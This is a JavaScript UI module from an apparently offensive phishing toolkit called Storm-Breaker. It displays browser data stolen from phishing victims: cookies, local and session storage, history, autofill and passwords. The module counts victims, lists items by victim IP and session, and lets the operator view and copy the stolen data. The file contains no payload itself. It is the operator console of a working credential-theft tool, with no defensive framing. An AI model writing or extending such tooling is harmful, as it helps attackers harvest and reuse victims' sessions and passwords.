/**
 * Storm-Breaker Browser Exfiltration UI Module
 * View and manage exfiltrated browser data (cookies, localStorage, history, autofill)
 */

const BrowserExfilUI = {
    exfilData: [],
    stats: {},

    init() {
        this.loadStats();
        this.loadData();
        this.bindEvents();
    },

    async loadStats() {
        try {
            const resp = await $.get('/api/browser-exfil/stats');
            this.stats = resp;
            this.renderStats();
        } catch (e) {
            console.error('Failed to load exfil stats', e);
        }
    },

    async loadData(type = null, ip = null) {
        try {
            let url = '/api/browser-exfil';
            const params = [];
            if (type) params.push(`type=${type}`);
            if (ip) params.push(`ip=${ip}`);
            if (params.length) url += '?' + params.join('&');

            const resp = await $.get(url);
            this.exfilData = resp.exfil_data || [];
            this.renderData();
        } catch (e) {
            console.error('Failed to load exfil data', e);
        }
    },

    renderStats() {
        const s = this.stats;
        $('#exfil-stats').html(`
            <div class="grid grid-cols-4 gap-3">
                <div class="bg-gray-700 rounded-lg p-4 text-center">
                    <div class="text-2xl font-bold text-cyan-400">${s.total || 0}</div>
                    <div class="text-xs text-gray-400">Total Items</div>
                </div>
                <div class="bg-gray-700 rounded-lg p-4 text-center">
                    <div class="text-2xl font-bold text-green-400">${s.unique_victims || 0}</div>
                    <div class="text-xs text-gray-400">Victims</div>
                </div>
                <div class="bg-gray-700 rounded-lg p-4 text-center">
                    <div class="text-2xl font-bold text-yellow-400">${(s.by_type || {})['cookies'] || 0}</div>
                    <div class="text-xs text-gray-400">Cookie Sets</div>
                </div>
                <div class="bg-gray-700 rounded-lg p-4 text-center">
                    <div class="text-2xl font-bold text-purple-400">${(s.by_type || {})['localStorage'] || 0}</div>
                    <div class="text-xs text-gray-400">Storage Items</div>
                </div>
            </div>
        `);
    },

    renderData() {
        const container = $('#exfil-data-list');
        container.empty();

        if (this.exfilData.length === 0) {
            container.html('<div class="text-center text-gray-400 py-8"><i class="fas fa-database text-4xl mb-3"></i><p>No exfiltrated data yet</p><p class="text-sm mt-2">Data will appear when victims visit phishing pages with browser exfil modules enabled</p></div>');
            return;
        }

        this.exfilData.forEach((item, idx) => {
            const data = typeof item.data === 'string' ? JSON.parse(item.data) : (item.data || {});
            const typeIcons = { cookies: '🍪', localStorage: '💾', sessionStorage: '📦', history: '📜', autofill: '📝', passwords: '🔑' };
            const icon = typeIcons[item.data_type] || '📄';
            const typeColors = { cookies: 'yellow', localStorage: 'cyan', sessionStorage: 'blue', history: 'purple', autofill: 'green', passwords: 'red' };
            const color = typeColors[item.data_type] || 'gray';

            let preview = '';
            let itemCount = 0;
            if (typeof data === 'object') {
                const keys = Object.keys(data);
                itemCount = keys.length;
                preview = keys.slice(0, 5).join(', ');
                if (keys.length > 5) preview += ` ... +${keys.length - 5} more`;
            } else {
                preview = String(data).substring(0, 100);
            }

            container.append(`
                <div class="bg-gray-700 rounded-lg p-4 hover:bg-gray-600 transition-colors">
                    <div class="flex items-center justify-between mb-2">
                        <div class="flex items-center gap-3">
                            <span class="text-2xl">${icon}</span>
                            <div>
                                <span class="px-2 py-0.5 bg-${color}-900 text-${color}-300 rounded text-xs font-semibold">${item.data_type || 'unknown'}</span>
                                <span class="text-xs text-gray-400 ml-2">from <span class="text-white font-mono">${this.escapeHtml(item.victim_ip)}</span></span>
                                ${item.session_id ? `<span class="text-xs text-gray-500 ml-1">session: ${this.escapeHtml(item.session_id.substring(0, 8))}...</span>` : ''}
                            </div>
                        </div>
                        <div class="flex items-center gap-2">
                            <span class="text-xs text-gray-500">${itemCount > 0 ? itemCount + ' items' : ''}</span>
                            <span class="text-xs text-gray-400">${item.timestamp || ''}</span>
                            <button class="btn-exfil-detail px-2 py-1 bg-cyan-600 text-white rounded text-xs hover:bg-cyan-500" data-idx="${idx}">
                                <i class="fas fa-eye mr-1"></i>View
                            </button>
                            <button class="btn-exfil-copy px-2 py-1 bg-gray-600 text-white rounded text-xs hover:bg-gray-500" data-idx="${idx}">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                    <div class="text-xs text-gray-400 font-mono bg-gray-800 rounded p-2 truncate">${this.escapeHtml(preview)}</div>
                </div>
            `);
        });

        // Bind view detail buttons using data attributes (no inline JSON)
        container.find('.btn-exfil-detail').off('click').on('click', (e) => {
            const idx = $(e.currentTarget).data('idx');
            if (idx >= 0 && idx < this.exfilData.length) {
                this.viewDetail(this.exfilData[idx]);
            }
        });
        container.find('.btn-exfil-copy').off('click').on('click', (e) => {
            const idx = $(e.currentTarget).data('idx');
            if (idx >= 0 && idx < this.exfilData.length) {
                const item = this.exfilData[idx];
                const data = typeof item.data === 'string' ? JSON.parse(item.data) : (item.data || {});
                navigator.clipboard.writeText(JSON.stringify(data, null, 2));
                GrowlNotification.notify({ title: 'Copied', description: `${item.data_type} data copied`, type: 'success', position: 'top-right', closeTimeout: 2000 });
            }
        });
    },

    viewDetail(item) {
        const data = typeof item.data === 'string' ? JSON.parse(item.data) : (item.data || {});
        const formatted = JSON.stringify(data, null, 2);
        Swal.fire({
            title: `${item.data_type} - ${item.victim_ip}`,
            html: `<pre style="text-align:left;max-height:400px;overflow:auto;background:#1e293b;color:#e2e8f0;padding:16px;border-radius:8px;font-size:12px;white-space:pre-wrap;word-break:break-all;">${this.escapeHtml(formatted)}</pre>`,
            width: '700px',
            showCancelButton: true,
            confirmButtonText: 'Copy Data',
            cancelButtonText: 'Close',
        }).then(result => {
            if (result.isConfirmed) {
                navigator.clipboard.writeText(formatted);
                GrowlNotification.notify({ title: 'Copied', description: 'Data copied to clipboard', type: 'success', position: 'top-right', closeTimeout: 3000 });
            }
        });
    },

    bindEvents() {
        $('#exfil-filter-type').on('change', () => {
            this.loadData($('#exfil-filter-type').val() || null, $('#exfil-filter-ip').val() || null);
        });
        $('#exfil-filter-ip').on('change', () => {
            this.loadData($('#exfil-filter-type').val() || null, $('#exfil-filter-ip').val() || null);
        });
        $('#btn-refresh-exfil').on('click', () => {
            this.loadStats();
            this.loadData();
            GrowlNotification.notify({ title: 'Refreshed', description: 'Exfiltration data refreshed', type: 'info', position: 'top-right', closeTimeout: 2000 });
        });
    },

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text || '';
        return div.innerHTML;
    },
};
